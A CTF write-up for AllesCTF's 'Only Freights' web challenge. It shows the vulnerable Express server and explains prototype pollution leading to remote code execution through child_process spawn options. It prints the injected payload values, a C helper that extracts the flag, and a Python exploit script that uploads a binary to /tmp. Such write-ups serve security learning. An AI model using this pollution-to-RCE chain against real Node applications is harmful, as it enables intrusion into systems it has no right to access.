+++
title = "AllesCTF 2020 Writeup [Only Freights]"
description = "AllesCTF -> Only Freights challenge writeup [uploading exploit to server to get flag]"
date = 2020-09-06T07:34:48+05:30
featured = false
draft = false
comment = false
toc = false
reward = false
categories = [
  "ctf"
]
tags = [
  "ctfs", 
  "writeups",
  "web"
]
series = []
images = ["images/allesctf.png"]
+++

I have played [AllesCTF 2021](https://ctftime.org/event/1091) with team [Invaders](https://ctftime.org/team/71588). We ended up at #21 worldwide.  
I solved 1 Web challenge -- Only Freights, along with our team captain [@S1r1u5_](https://twitter.com/@S1r1u5_)

<!--more-->

##### **Challenge description:**
Check out my ~~OnlyFans~~ OnlyFreights! A website to classify all the freight ships.  
NOTE: There is a secret cargo stored at /flag.txt, but you need to convince the /guard executable to hand it to you!

##### **Brief Solution:**
1. Using the app.put('/api/directory*') route, we can achieve prototype pollution.
2. Using prototype pollution to change some variable values in child_process.spawn to get RCE. (CVE-2019-7609)
3. Using RCE to put an executable into /tmp directory of the server and run it to get the flag!


##### **Detailed Solution:**
Given [server.js](files/server.js)
```js
const express = require("express");
const bodyParser = require("body-parser");
const morgan = require("morgan");
const { spawn } = require("child_process");
const data = require("./data.json");

const BIND_ADDR = process.env.BIND_ADDR || "127.0.0.1";
const PORT = process.env.PORT || "1337";

const app = express();

app.use(morgan("dev"));
app.use(express.static("./static"));
app.use(bodyParser.json());

function find(path) {
	if (path.endsWith("/")) {
		path = path.substring(0, path.length - 1);
	}
	path = path.substring(1);

	let current = data;
	if (path.length > 0) {
		for (let segment of path.split("/")) {
			current = current[segment];
		}
	}

	return current;
}

app.get("/api/directory*", (req, res) => {
	let path = decodeURIComponent(req.path.substring("/api/directory".length));
	if (!path.startsWith("/")) {
		return res.status(404).send("no.");
	}

	let dataItem = find(path);
	if (!dataItem) {
		return res.status(404).send("dunno");
	}

	let children = Object.keys(dataItem);
	res.json(children);
});
app.put("/api/directory*", (req, res) => {
	let path = decodeURIComponent(req.path.substring("/api/directory".length));
	if (!path.startsWith("/")) {
		return res.status(404).send("no.");
	}

	let parentPath = path.split("/").reverse().slice(1).reverse().join("/");
	let id = path.replace(parentPath + "/", "");
	let { value } = req.body;
	find(parentPath)[id] = value;

	res.send("ok");
});

// TODO: remove before release
app.get("/_debug/stats", (req, res) => {
	let child = spawn("ps");
	let output = "";
	const writer = (data) => {
		output += data;
	};
	child.stdout.on("data", writer);
	child.stderr.on("data", writer);
	child.on("close", () => res.type("text/plain").send(output));
});

app.listen(PORT, BIND_ADDR, () => {
	console.log(`OnlyFreights listening on ${BIND_ADDR}:${PORT}`);
});
```

&nbsp;&nbsp;&nbsp;&nbsp;The website is using app.get('/api/directory*') to fetch JSON data from data object which is essentially a JSON object, and app.put('/api/directory*') to insert data into that data object.  

* app.get('/api/directory/test/abc') **=>** to get the JSON data from data like data[test][abc]  
* app.put('/api/directory/test/abc' (put data: {"value":{}}) **=>** to insert JSON data into data like data[test]={"abc":{}}  
* app.get('/_debug/stats') **=>** to print spawn('ps') output  
* find(path) **=>** to find the path in data object like find('/abc/def/ghi/') **=>** data[abc][def][ghi]  

&nbsp;&nbsp;&nbsp;&nbsp;So, here we can do prototype pollution using the put request. put('/api/directory/\_\_proto\_\_/x') with JSON data as {"value":"test"} will set the Object.prototype.x as "test". Now as mentioned in [CVE-2019-7609](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), we can achieve RCE by setting the following variables on the server:

\> Object.prototype.shell = "node";  
\> Object.prototype.NODE_OPTIONS = "--require /proc/self/environ";  
\> Object.prototype.env = {"AAA": "'';cp=require('child_process');ex=cp.exec('id',{'stdio':'inherit'})//"};  

&nbsp;&nbsp;&nbsp;&nbsp;And then we have to send a get request to /_debug/stats to execute our commands.

&nbsp;&nbsp;&nbsp;&nbsp;The flag cannot be read directly, because of permissions. But there is an executable (/guard) which can be run to get the flag. But it is printing a math equation and we have to solve it to get the flag. I thought we have to somehow execute /guard and evaluate the given expression and get the output using only the child_process.spawn and I tried different things and none worked. Then our captain came up with the idea of sending an executable exploit (that runs the /guard and solve the equation and prints the flag) as base64 string and write it's decoded data to a file in /tmp (since no file creating permissions in current working directory), change it to executable (chmod +x /tmp/exp) and run it to get the flag.

&nbsp;&nbsp;&nbsp;&nbsp;And captain wrote the C script to solve the equation and printing the flag and I wrote the script to send the exploit to server and get the flag, but the executable didn't give us any output. To debug this, I setup the given docker in my system and ran the exploit on localhost. Then I got to know that the executable that I compiled in my system is incompatible with the server system. The server is using alpine distribution and [here](https://stackoverflow.com/questions/59341750/why-cant-i-run-a-c-program-built-on-alpine-on-ubuntu)'s why it didn't run.

&nbsp;&nbsp;&nbsp;&nbsp;Now I copy pasted the C code into the local docker and compiled it inside the docker to make it compatible with the server system. And using that executable data, I ran the exploit on the server and got the flag. Here are the exploit C code and python code.

Exploit code to execute /guard, solve the equation and print the output: [guard_break.c](files/guard_break.c)
```c
#include<unistd.h>
#include<sys/wait.h>
#include<sys/prctl.h>
#include<signal.h>
#include<stdlib.h>
#include<string.h>
#include<stdio.h>

unsigned long int solve(char *data) {
	unsigned int out,a,b;
	sscanf(data,"%d + %d",&a,&b);
	return a+b;
}

int main(int argc, char** argv) {
	pid_t pid = 0;
	int inpipefd[2];
	int outpipefd[2];
	char buf[256];
	char msg[256];
	char ans[256];
	char flag[256];
	int status;

	pipe(inpipefd);
	pipe(outpipefd);
	pid = fork();
	if (pid == 0) {
		dup2(outpipefd[0], STDIN_FILENO);
		dup2(inpipefd[1], STDOUT_FILENO);
		dup2(inpipefd[1], STDERR_FILENO);
		prctl(PR_SET_PDEATHSIG, SIGTERM);
		execl("/guard", "/flag.txt", (char*) NULL);
		exit(1);
	}
	close(outpipefd[0]);
	close(inpipefd[1]);

	read(inpipefd[0], buf, 256);
	unsigned long int an = solve(buf);
	sprintf(ans,"%lu",an);
	ans[strlen(ans)]='\n';
	ans[strlen(ans)+1]='\0';
	write(outpipefd[1], ans, strlen(ans));
	read(inpipefd[0], flag, 256);
	printf("Flag: %s\n",flag);
	kill(pid, SIGKILL); //send SIGKILL signal to the child process
	waitpid(pid, &status, 0);
}
```

Python code to do prototype pollution and execute commands: [exploit.py](files/exploit.py)
```py3
from requests import *
import json

routes = {
	'put': 'api/directory/__proto__/',
	'debug': '_debug/stats'
}

def PuT(var,value):
	j = json.dumps({ 'value': value })
	h = { 'Content-Type': 'application/json' }
	r = put(url + routes['put'] + var, data = j, headers = h)

def DeBuG(flag = False):
	r = get(url + routes['debug'])
	if flag: print(r.text)

url = input('url: ')

# You can get the exp.b64 content at https://gist.github.com/Sud0u53r/5798a18740c0c34562db193e3b2574e1
with open('exp.b64') as f:
	exp = f.read()

PuT('shell', "node")
PuT('NODE_OPTIONS', "--require /proc/self/environ")
PuT('env', {"AAA": "'';cp=require('child_process');ex=cp.exec('echo %s | base64 -d > /tmp/exp',{'stdio':'inherit'})//"%exp})
print('[+] Uploaded exploit to /tmp/exp...')
```

Flag: `ALLES{Gr3ta_w0uld_h4te_th1s_p0lluted_sh3ll}`

##### Thanks for reading! {align=center}